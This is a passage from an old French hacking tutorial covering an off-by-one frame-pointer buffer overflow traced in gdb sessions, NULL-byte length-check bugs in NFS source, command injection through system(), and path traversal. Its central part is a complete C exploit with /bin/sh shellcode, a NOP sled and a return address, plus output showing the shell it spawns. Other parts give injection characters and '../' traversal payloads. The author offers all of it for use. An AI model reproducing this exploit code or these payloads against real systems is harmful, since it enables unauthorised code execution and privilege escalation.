 * l'adresse que le pointer pointe au debut de celle-ci. 
 * Ce qui donne 0x34 - 0x4 = 0x30. On va verifier:
 */
/* Autre session gdb */
$gdb -q 9
(gdb) r `perl -e 'printf "\x30"x257'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: ./9 `perl -e 'printf "\x30"x257'`
 
Program received signal SIGSEGV, Segmentation fault.
0x30303030 in ?? () 
/* 
 * On tombe bien sur des caracteres de notre buffer!
 */     
(gdb) r `perl -e 'printf "\x34"x257'`
Starting program: ./9 `perl -e 'printf "\x34"x257'`
 
Program received signal SIGSEGV, Segmentation fault.
0x34343434 in ?? ()
/* 
 * De 0x30 � 0x34 Il y a bien des carateres de notre buffer.
 */ 
(gdb) r `perl -e 'printf "\x36"x257'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: ./9 `perl -e 'printf "\x36"x257'`
 
Program received signal SIGSEGV, Segmentation fault.
0xf7363636 in ?? ()
(gdb)quit
$
/*
 * Nous avons bien la fin de notre buffer à 0x35 !!!
 */  
                  
/* Fin session special gdb */

/* 
 * L'adresse que nous allons mettre de 0xbffff734 � 0xbffff738  
 * sera celle du debut du buffer, donc il nous reste à trouver
 * l'adresse du debut du buffer . Vue que notre buffer est de 257
 * 257(dec)= 101(hex) : 0x738 - 0x101 = 0x637 Ca devrais se trouver
 * par l�...
 */
(gdb) x/wx 0xbffff637
0xbffff637:     0x00010140
(gdb) x/wx 0xbffff638
0xbffff638:     0x00000101
(gdb) x/wx 0xbffff639
0xbffff639:     0x42000001
(gdb) x/wx 0xbffff640
0xbffff640:     0x42424242     

/* 
 * Trouv�!!!!!
 */

Maintenant que nous avons toutes les informations , nous pouvons exploiter la
faille:

/* Exploit pour 9.c => exp.c */
/* Anti-Social */
#include <stdio.h>
char shellcode[] = /* shellcode */
 "\xeb\x16\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b"    
 "\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh";

main()
{
int i;
char addr[]="\xbf\xff\xf6\x40\x30"; /* 
                                     * adresse du debut du buffer: 0xbffff640
                                     * +
                                     * l'octet d'alteration de %ebp
                                     */
char nop[]="\x90"; /* NOP*/
char buffer[1024]; /* notre buffer */
bzero(buffer, 1024); /* on remet le buffer � zero */
for(i=0;i<=215;i++){ /* 
strcat(buffer,nop);   * On remplit le buffer avec 215 x NOP (0x90) 
}                     */
strcat(buffer,shellcode); /* On entre notre shellcode dans le buffer */
strcat(buffer,addr); /* on entre nos adresses */
printf("buffer=%d\n",strlen(buffer)); /*on verifie la taille de notre buffer*/ 
 execl("./9","9", buffer, NULL); /* On balance la sauce!!! */
/* 
 * [                   b  u  f  f  e  r                         ]
 * [NOP][shellcode][RET-shellocde][Addr-qui-altere-%ebp-sur-1octet]
 */
}
/* FIN */
$cc -o exp exp.c
$./exp
257
�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������[�1�C�C
                                                                 �
                                                                  ��S
                                                                     ̀�����/bin/sh���@0
sh-2.03$ 

C'est pas beau ca?!!!!!
J'espere que vous arriverez à bien comprendre car ce n'est pas tres simple à
expliquer...


Donc le frame pointeur n'est pas un mite, il est realité,
donc merci à toi Klog!

e-Bugs liés au caractere "NULL" (0x00)...
===========================================

En regardant les sources de nfs, j'ai été illuminé par une idée!
En faite c'est tres simple:

/* lignes pompées des sources de nfs 2.2 beta 47 */
	if (strlen(fhc->path) + strlen(dopa->name) + 1 >= NFS_MAXPATHLEN)
	return NFSERR_NAMETOOLONG;

	sp = fhc->path;
	while (*sp)		/* strcpy(buf, fhc->path); */
	*buf++ = *sp++;
	*buf++ = '/';		/* strcat(buf, "/");  */
	sp = dopa->name;
	while (*sp) {		/* strcat(pathbuf, argp->where.name); */
	if (*sp == '/')
	return NFSERR_INVAL;
	*buf++ = *sp++;
	}
	*buf = '\0';
/* FIN */

Pour ceux qui aurrait pas comprit, il s'agit d'une fonction qui est identique
a un strcpy... Donc un frame pointer bug!! Mais la ou il y a un petit problème,
c'est qui verifie que la taille de fhc->path & dopa->name pour voir si elle
depasse pas la taille MAX du buffer... Mais la personne qui a codé cela n'a
pas du lire le man de strlen ou il est vraiment bete!
Comme vous le savez strlen donne la taille de la chaine jusqu'a quelle trouve
un caractère NULL (\x00) mais par contre  "while (*sp)*buf++ = *sp++;" va
copier les caractères NULL au defaut de strcpy...

Pour ce qui serait vraiment bete:
/* retransition des lignes pomp�es des sources de nfs 2.2 beta 47 */
	if (strlen(\x00AxNFS_MAXPATHLEN+4) + strlen(\x00) + 1 >=
        NFS_MAXPATHLEN) 	
        return NFSERR_NAMETOOLONG;

	sp = "\x00AxNFS_MAXPATHLEN+4";
	while (*sp)		/* strcpy(buf, fhc->path); */
	*buf++ = *sp++; /* buf = "\x00AxNFS_MAXPATHLEN+4"
                         * OVERFLOW!!!!!!!!!!!!
                         */
/* FIN */

Ce-ci est un bug logique...Je pense que on a déjà du l'exploiter...

/* Anti-Social */
/* Ex2.c */
/* 0x00 pb */
main(){
{
char dec[]="BB";
char topic[]="\x00";
int len;
len = strlen(topic);
if(!strncmp(topic, dec, len)){
printf("BRAVO\n");
}
else{
printf("BLA\n");
}
}
/* FIN */
$./Ex1
BRAVO

f- Escape shell
===============

Un escape shell est en faite une fonction qui fait appel à un shell
( example : system(); ) , et si on a un access dessus , on peut detourner la
commande à executer.

example:
-------
char buffer[4096];
snprintf(buffer,4096,"ls -la /%s",argv[1]);
system(buffer);

Si argv[1] contient un signe: ";" "&" "|" ... Je vous laisse tester...

ps: popen est aussi touché par ce bug...

g- Open Bug
===========
/* PAS FINI */
Vous trouverez ce genre de bug plutot dans un serveur web, cgi, ...
Ce bug est tres bete mais pourtant encore utilisé par beaucoup
d'exploit sur cgi...

Les commandes affectées:
OPEN(); FOPEN(); POPEN(); CHDIR(); GETCWD(); LINK(); SYMLINK(); 
OPENDIR(); FREOPEN(); TMPNAM(); REALPATH(); ...

/* FIN PAS FINI */

Le bug:
-------

Il s'agit d'ouvrir des fichiers ou des repertoires ou l'on n'a pas accès 
en temps normale. Pour cela il suffit de faire:
../../../../../rep ou ../../../../../file

C'est tres tres simple comme vous pouvez le constater...
Si verification de caractères dans les chaines comme protection,
contre parade possible: \0../../ ... 

h- divers
=========

- L'effacement de buffer
-------------------------- 
Cela n'est pas vraiment un bug , en faite il s'agit
d'un truc tout simple c'est les caracteres "\n" "\r" "\b", celui qui nous
interesse le plus :
-"\b" : caractère de retour arrière(déplace le curseur d'un caractère vers la
gauche)
-"\r" : caractere debut de ligne (place le curseur au debut de la ligne en
cours)
Donc imaginons que un snprintf vas sur un "open,system,..." il suffi d'effacer
tous pour reinscrire le buffer!  

- Race Condition 
-----------------

exploitation d'un état peu sur,provisoirement créé par l'exécution d'un
programme pour accéder aux données sensibles. 

- inconue
----------

Celle-la c'est a toi de l'inventer....


2- Chercher la faille
_____________________

Pour ca plusieurs solutions:
                            -Un scan.
                            -Faire à la main , un par un.... 
                            
J'en vois pas beaucoup d'autres....

Toutes les informations peuvent etre interessante, il ne faut pas se dire
cette fonction n'est pas dans ma liste de fonctions vulnerbale , donc je la
laisse tomber car celle-ci est peut etre un bug non connu...
Biensur il faut aussi bien connaitre le langage sur le quelle vous recherchez
un bug.
 
a- Verification d'une potentielle faille
----------------------------------------

Deja compiler le programme, puis vous prenez gdb(l'ami de l'homme comme dirait
aleph1).
"cc -g -o file file.c" 
example:
--------
Anti-Social@:~/> gdb -q ./b2
(gdb) disassemble main
Dump of assembler code for function main:
0x8048330 <main>:       push   %ebp
0x8048331 <main+1>:     mov    %esp,%ebp
0x8048333 <main+3>:     sub    $0x200,%esp
0x8048339 <main+9>:     mov    0xc(%ebp),%eax
0x804833c <main+12>:    add    $0x4,%eax
0x804833f <main+15>:    mov    (%eax),%edx
0x8048341 <main+17>:    push   %edx
0x8048342 <main+18>:    push   $0x80483cc
0x8048347 <main+23>:    lea    0xfffffe00(%ebp),%eax
0x804834d <main+29>:    push   %eax
0x804834e <main+30>:    call   0x80482b0 <sprintf>
0x8048353 <main+35>:    add    $0xc,%esp
0x8048356 <main+38>:    lea    0xfffffe00(%ebp),%eax
0x804835c <main+44>:    push   %eax
0x804835d <main+45>:    push   $0x80483d0
0x8048362 <main+50>:    call   0x80482a0 <printf>
0x8048367 <main+55>:    add    $0x8,%esp
0x804836a <main+58>:    mov    %ebp,%esp
0x804836c <main+60>:    pop    %ebp
0x804836d <main+61>:    ret                        
End of assembler dump. 
(gdb) x/8 0x80483cc
0x80483cc <_IO_stdin_used+4>:   0x000a7325 
Cannot access memory at address 0x80483d0. 
(gdb) break main
Breakpoint 1 at 0x8048339: file b2.c, line 5.
(gdb) r
Starting program: ./b2
 
Breakpoint 1, main (argc=1, argv=0xbffff894) at b2.c:5
5       sprintf(bla,"%s\n",argv[1]);
(gdb) print &bla
$1 = (char (*)[512]) 0xbffff648  
(gdb) print &argv[1]
$2 = (char **) 0xbffff898  
(gdb) print argv[1]
$3 = 0x0 
(gdb) info reg
eax            0xbffff89c       -1073743716
ecx            0x8048330        134513456
edx            0x40116ed4       1074884308
ebx            0x40115ff8       1074880504
esp            0xbffff648       0xbffff648
ebp            0xbffff848       0xbffff848
esi            0x4000ac70       1073785968
edi            0xbffff894       -1073743724
eip            0x8048339        0x8048339
eflags         0x286    646
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0   
(gdb) break *0x804834e
Breakpoint 2 at 0x804834e: file b2.c, line 5.                                                              
(gdb) c
Continuing.
 
Breakpoint 2, 0x804834e in main (argc=1, argv=0xbffff894) at b2.c:5
5       sprintf(bla,"%s\n",argv[1]);   
(gdb) info reg
eax            0xbffff648       -1073744312 /* adresse de bla */
ecx            0x8048330        134513456
edx            0x0      0                   /* contenu de argv[1] */
ebx            0x40115ff8       1074880504
esp            0xbffff63c       0xbffff63c  /* push   $0x80483cc */
                                            /* entr�e user */
ebp            0xbffff848       0xbffff848 
esi            0x4000ac70       1073785968
edi            0xbffff894       -1073743724
eip            0x804834e        0x804834e  /* call sur sprintf */
eflags         0x282    642
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0  
(gdb) x/8 0xbffff63c
0xbffff63c:     0x48    0xf6    0xff    0xbf    0xcc    0x83    0x04    0x08
/*  0x080483cc  */
(gdb) x/8 0x080483cc
0x80483cc <_IO_stdin_used+4>:   0x25    0x73    0x0a    0x00    0x25    0x73   0x00     0x00                  
/* le push */
(gdb) x/8 0xbffff848
0xbffff848:     0x68    0xf8    0xff    0xbf    0x13    0x83    0x03    0x40  
/* 0xbffff868 */
(gdb) x/16 0xbffff868
0xbffff868:     0x00    0x00    0x00    0x00    0xe1    0x82    0x04    0x08   
(gdb) x/8 0x080482e1
0x80482e1 <_start+33>:  0xf4    0x90    0x90    0x90    0x90    0x90    0x90   0x90 
    
Voila maintenant à vous d'utiliser ces informations à votre avantage.         
        

3- Exploitation de la faille
____________________________

- Ecrire le code
------------------

En general c'est assez simple...
Recherche de l'offset + bufsize.
Le seul probleme peut etre quel shell code utiliser?
Cela depend le prog exploité, si c'est en local un /bin/sh suffi, sinon
utiliser un shell bind sur un port ou un truc dans le style si vous n'etes pas
sur.


4- Faire un patch
_________________

Pour un buffer overflow suffi de mettre une fonction secure:
snprintf , strncpy , strncat, memccpy ...
Pour un escape shell suffi de verifier ce qui entre avec strncmp par
example...

Apres avoir réécrie le fichier faite:
$diff ancien-fichier.c nouveau-fichier.c > patch.diffs

Pour appliquer le patch:
$patch ancien-fichier.c patch.diffs




Voila c'est fini , j'espere que ca vous aura aidé!
@Anti-Social@



